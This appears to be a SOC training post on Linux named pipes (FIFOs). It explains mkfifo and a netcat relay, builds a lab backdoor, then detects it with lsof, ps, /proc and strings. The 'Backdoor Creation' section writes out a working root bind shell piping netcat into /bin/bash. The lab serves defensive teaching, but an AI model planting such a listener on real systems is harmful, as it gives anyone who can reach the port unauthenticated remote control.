
- [Introduction](#introduction)
- [Backdoor Creation](#backdoor-creation)
- [Defensive Analysis](#defensive-analysis-of-suspicous-process)



## Introduction

We all Know pipe(`|`)
- pipe redirects of `command1` output as `command2` input
  - `command1 | command2`. ex: `cat flag.txt | grep "flag"`

While a standard "pipe" (`|`) is **temporary** and exists only while the command is running, a **FIFO** is a real file that **sits on your disk**, allowing unrelated programs to talk to each other.

## How a FIFO Works

The name "First-In, First-Out" tells you exactly how the data flows: the first piece of data written into the pipe is the first piece of data that must be read out of it.

Think of it like a physical pipe in a house:

1. **Process A** pours data into one end.
2. **Process B** catches data at the other end.
3. If Process B isn't there to catch it, Process A will usually wait (**block**) until someone starts reading.

**Creation of FIFO**

```bash
mknod backpipe p  # older documentation and sysadmin scripts.
```
- It is oldway of doing FIFO 
```bash
mkfifo backpipe
```

Verify
```bash
prw-r--r-- 1 user group 0 Oct 24 10:00 backpipe
```
![](/assets/img/soc/backdoor/fifocreate.png)

### Example

**Terminal 1 (The Reader)**

This process will hang and wait for data:
```bash
cat < backpipe
```

**Terminal 2 (The Writer)**

As soon as you run this, the text will appear in Terminal 1:

```bash
echo "Hello through the pipe!" > backpipe
```
![](/assets/img/soc/backdoor/fifocat.png)

**Key Characteristics**

- **Persistence:** Unlike anonymous pipes, a FIFO stays on the disk until you manually delete it.
- **Bidirectional (but usually one-way):** While data can flow, it's typically used for one-way communication to avoid confusion.
- **Blocking:** By default, a process opening a FIFO to write will "hang" until another process opens it to read.
- It Exists as a file on disk
- Scope of FIFO is Any process with file permissions
- Lifespan is Permanent until deleted

**Note:** Even though a FIFO appears on your disk (using `ls -l` will show a `p` at the start of the permissions), it doesn't actually store data on the hard drive. It acts as a memory buffer; the disk entry is just a "hook" for processes to find each other.


## The "Backpipe" Concept

A **backpipe** is a clever networking trick that uses a FIFO to create a two-way communication bridge, usually involving `netcat` (nc).

If you want to redirect traffic from one port to another and see the response come back, a standard pipe isn't enough because it only goes one way. A FIFO acts as the "return path"—hence the name backpipe.

**A Classic Example: The Netcat Relay**

If you want to create a simple proxy that forwards traffic from port 8080 to a web server on port 80, you would use a FIFO like this:

1. **Create the FIFO:** `mkfifo backpipe`
2. **The Relay Command:** `nc -l -p 8080 < backpipe | nc example.com 80 > backpipe`

**How that command works:**

- The first `nc` listens on 8080 and sends its output to the second `nc`.
- The second `nc` sends that data to the web server.
- The backpipe takes the response from the web server and feeds it back into the input of the first nc so the user can see it.



## Backdoor Creation

For this need to be run 3 terminals

> Terminal 1 is where the backdoor will be run.

> Terminal 2 is where we will connect to the back door.

> Terminal 3 is where we will be running our analysis.


### Terminal 1

```bash
sudo su -
```
- `sudo su`: You stay in `/home/raj-kumar/Desktop/soc/test/`.
- `sudo su -`: You are instantly teleported to `/root/`

Then
```bash
mkfifo backdoor  # Creating a FIFO

nc -lvp 4321 < backdoor | /bin/bash > backdoor  # Creating a Bidirectional nc Listener

```

### Terminal 2

```bash
ifconfig # For Geting IP address of Syystem
```

```bash
nc -p 4545 10.75.205.113 4321
```

>[!NOTE]
>
>**YOUR IP WILL BE DIFFERENT**

![](/assets/img/soc/backdoor/backdoor.png)




## Defensive Analysis Of Suspicous Process

How SOC anlayst check process in their system Identify **Backdoors**.

Let's start by looking at the network connections with **lsof**. When we use lsof, we are looking at open files. When we use the `-i` flag we are looking at the open Internet connections. When we use the `-P` flag we are telling lsof to not try and guess what the service is on the ports that are being used. Just give us the port number.

```bash
lsof -i -P
```
![](/assets/img/soc/backdoor/lsofall.png)

- `-i`: (Internet) This narrows the list down to network files only.
  - You can be specific, like `lsof -i :4321` to only see what is on that one port.
- `-P`: (Port numbers, not names) By default, lsof tries to be "helpful" by converting port numbers into service names.
  - **Without `-P`:** It might show localhost:http instead of localhost:80.
- `-n`: Inhibits the conversion of IP addresses to hostnames.

Now let's dig into the **netcat process ID**. We can do this with the lowercase `-p` switch. This will give us all the open files associated with the listed process ID.

```bash
lsof -p [PID]
```
![](/assets/img/soc/backdoor/lsofprocess.png)

Let's look at the full processes. We can do this with the **ps** command. We are also adding the **a, u, and x switches**.

- `a` is for all processes
- `u` is for sorted users
- `x` is for all processes using a teletype terminal

Type out this command.
```bash
ps aux
```

![](/assets/img/soc/backdoor/psaux.png)

Let's change directories into the **proc** directory for that **pid**. Remember, **proc** is a directory that does not exist on the drive. It allows us to see data associated with the various processes directly. This can be very useful as it allows us to dig into the memory of a process that is currently running on a suspect system.

```bash
cd /proc/[pid]
ls
```
We can see a number of interesting directories here:
![](/assets/img/soc/backdoor/processdirectory.png)

We can run the **strings** command on the executable in this directory. When programs are created there may be usage information, mentions of system libraries, and possible code comments. We use this all the time to attempt to identify what exactly a program is doing.

```bash
cat exe | strings | less
```
![](/assets/img/soc/backdoor/processinfo.png)

